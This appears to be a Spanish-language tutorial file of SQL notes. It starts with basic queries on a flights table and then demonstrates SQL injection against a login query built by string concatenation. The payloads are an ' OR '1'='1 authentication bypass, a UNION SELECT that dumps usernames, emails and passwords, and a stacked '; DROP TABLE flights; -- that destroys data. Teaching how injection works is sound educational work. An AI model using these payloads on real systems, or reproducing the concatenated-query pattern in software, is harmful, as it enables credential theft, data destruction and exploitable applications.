--Seleccionar todos los vuelos:
SELECT * FROM `flights`;

--Obtener la estacion de salida de todos los vuelos:
SELECT departure_station 
FROM `flights`

--Uso de alias. ej: no quisiera ver la estacion de salida como 'depature_station', sino como 'salida'
SELECT departure_station as salida
FROM `flights`

SELECT departure_station as salida, arrival_station as llegada, flight_date as fecha, flight_time as hora
FROM `flights`

-- Condiciones: Seleccionar todos los vuelos de una fecha especifica:
SELECT departure_station, arrival_station, flight_date, flight_time
FROM `flights`
WHERE flight_date = '15-10-2025'

-- UNION
SELECT departure_station, arrival_station, flight_date
FROM `flights` 
UNION
SELECT username as departure_station, email as arrival_station, password as flight_date
FROM `users` 

--Lguear usuarios (login bypass 1=1)
SELECT * 
FROM `users` 
WHERE username='jose123' AND password='jose1234'

Tengo dos variables: $username y $password.
reemplazo los valores por las variables:
$username = 'jose123'
$password = 'jose1234'

SELECT * 
FROM `users` 
WHERE username='$username' AND password='$password'

SELECT * 
FROM `users` 
WHERE username='$username' AND password='$password' OR 1=1

SELECT * 
FROM `users` 
WHERE username='jose1aoisjdfopiasf23' AND password='jaeopifjhasdf8ose123'


Ataque de inyeccion de SQL:
$username = "jose1aoisjdfopiasf23"
$password = "jaeopifjhasdf8ose123' OR '1'='1"
Vamos a reemplazar los valores por las variables:
SELECT * 
FROM `users` 
WHERE username='jose1aoisjdfopiasf23' AND password='jaeopifjhasdf8ose123' OR 1=1

-- Ataque de inyeccion de SQL para obtener todas las contraseñas:
' UNION SELECT id, username, email, password, NULL FROM users -- 

-- Ataque de inyecci[on de SQL para eliminar una tabla
SELECT * FROM flights WHERE departure_station LIKE '%lo'; DROP TABLE flights;

-- $search_term = lo'; DROP TABLE flights; -- 
SELECT * FROM flights WHERE departure_station LIKE '%$search_term%'
SELECT * FROM flights WHERE departure_station LIKE '%lo'; DROP TABLE flights; -- %'

